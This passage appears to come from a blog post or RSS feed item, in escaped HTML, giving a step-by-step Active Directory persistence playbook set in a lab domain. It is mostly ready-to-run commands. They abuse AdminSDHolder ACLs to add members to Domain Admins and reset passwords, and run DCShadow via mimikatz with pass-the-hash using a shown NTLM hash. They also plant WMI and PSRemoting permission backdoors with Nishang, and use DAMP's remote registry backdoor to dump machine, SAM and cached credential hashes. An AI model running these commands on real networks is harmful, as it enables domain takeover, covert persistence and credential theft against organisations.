&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADACL&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Principal&lt;/span> &lt;span class="s1">&amp;#39;STUDENT1&amp;#39;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>but there are also other interesting permissions (&lt;strong>ResetPassword&lt;/strong>, &lt;strong>WriteMembers&lt;/strong>) for a user to the AdminSDHolder:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">ResetPassword&lt;/span> &lt;span class="n">-VerboseAdd-ObjectAcl&lt;/span> &lt;span class="n">-TargetADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">WriteMembers&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Run SDProp manually using Invoke-SDPropagator.ps1 (requires DA privileges):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Pre-Server 2008 machines&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-SDPropagator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SDPropagator&lt;/span> &lt;span class="n">-taskname&lt;/span> &lt;span class="n">FixUpInheritance&lt;/span> &lt;span class="n">-timeoutMinutes&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-showProgress&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Server 2008 and beyond&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-SDPropagator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SDPropagator&lt;/span> &lt;span class="n">-timeoutMinutes&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-showProgress&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Verify the successful update of Domain Admins ACL (as normal user):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;AD:\CN=Domain Admins,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Access&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Once you have the requested permissions on desired objects, it is possible to abuse FullControl/WriteMember (running as the user previousely added) to add new users to the Domain Admins group:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-DomainGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Members&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Members&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or perform ResetPassword (running as the user previousely added):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainUserPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span> &lt;span class="n">-AccountPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">Force&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADAccountPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span> &lt;span class="n">-NewPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">Force&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="dcshadow">DCShadow&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Start a mimikatz session as SYSTEM and run the below commands to modify an attribute (in this case the SPN is set to “Replication/DC”:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcshadow /object:STUDENT2 /attribute:servicePrincipalName /value:&amp;#34;Replication/DC&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Then from mimikatz impersonate a Domain Admin and push the attributes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /user:Administrator /domain:cybercorp.local /ntlm:78603c228a04497e15e870688ea2e02d /impersonate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcshadow /push
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we would like to do the above without using DA, the only thing that changes is the “push”. Instead of running mimikatz as DA to push the attributes, we can use SetDCShadowPermissions to provide minimal rights to a user (STUDENT1) in order to change attributes to another user (STUDENT2). Keep in mind that, for once, we will still need to have DA privileges.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Run the below command from a PowerShell session running as DA:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Set-DCShadowPermissions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DCShadowPermissions&lt;/span> &lt;span class="n">-FakeDC&lt;/span> &lt;span class="s2">&amp;#34;fake-dc&amp;#34;&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Then as STUDENT1 run mimikatz and push the attributes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcshadow /push
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>In order to remove the just provided permissions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Set-DCShadowPermissions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DCShadowPermissions&lt;/span> &lt;span class="n">-FakeDC&lt;/span> &lt;span class="s2">&amp;#34;fake-dc&amp;#34;&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Remove&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)&lt;/h2>
&lt;p>ACLs can be modified to allow non-admin users access to securable objects.&lt;/p>
&lt;p>Allow access permission on local machine for STUDENT1 user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Allow access permission on a remote machine for STUDENT1 without explicit credentials&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;DC&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Allow access permission on a remote machine with explicit credentials. Only root2 and nested namespaces:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Remove access permission on a remote machine remove permissions :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Remove&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powershell-remoting">PowerShell Remoting&lt;/h2>
&lt;p>Allow PSRemoting access permission on local machine for STUDENT1:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemotePSRemoting&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Allow PSRemoting access permission on a remote machine for STUDENT1 without credentials:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemotePSRemoting&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Remove PSRemoting access permission on a remote machine for STUDENT1:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemotePSRemoting&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Remove&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-registry">Remote Registry&lt;/h2>
&lt;p>Using DAMP, with admin privileges on a remote machine, it is possible to implement a new remote registry backdoor that allows for the remote retrieval of a system&amp;quot;s machine and local account hashes, as well as its domain cached credentials.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Add-RemoteRegBackdoor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-RemoteRegBackdoor&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Trustee&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As STUDENT1, abuse the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The machine account hash for the specified machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">RemoteHashRetrieval&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-RemoteMachineAccountHash&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The local SAM account hashes for the specified machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">RemoteHashRetrieval&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-RemoteLocalAccountHash&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The domain cached credentials for the specified machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">RemoteHashRetrieval&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-RemoteCachedCredential&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;hr></description></item></channel></rss>